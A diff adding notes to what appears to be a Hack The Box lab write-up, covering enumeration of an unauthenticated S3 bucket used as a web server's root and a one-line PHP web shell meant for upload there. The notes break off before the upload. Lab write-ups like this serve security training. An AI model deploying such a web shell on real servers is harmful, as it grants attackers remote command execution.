@@ -161,6 +161,50 @@ s3.thetoppers.htb
 ```
 
 #### s3
-- wdasd
-	->
-	
+- **Amazon Simple Storage Server**
+	-> obj storage service, supports buckets
+	-> s3 buckets stores files called s3 objects
+	-> use `awscli` to interact with s3 buckets
+
+```css
+aws configure
+
+AWS Access Key ID [None]: temp
+AWS Secret Access Key [None]: temp
+Default region name [None]: temp
+Default output format [None]: temp
+```
+
+-> even though servers sometimes not configued to check auth, still needs to be configured to something
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+
+---
+2022-07-2118:35:09thetoppers.htb
+```
+
+-> we can list all the buckets hosted by the server by ls
+
+-> further lists objects and common prefixes under the specified bucket
+
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+
+---                 PRE   images/
+2022-07-21 18:35:09 0     .htaccess
+2022-07-21 18:35:10 11952 index.php  
+```
+
+-> this is the webroot, apache server is using this s3 bucket as storage
+
+-> `awscli` can use `cp` to copy files to remote bucket, so we can upload a **PHP shell**
+
+php payload:
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+use
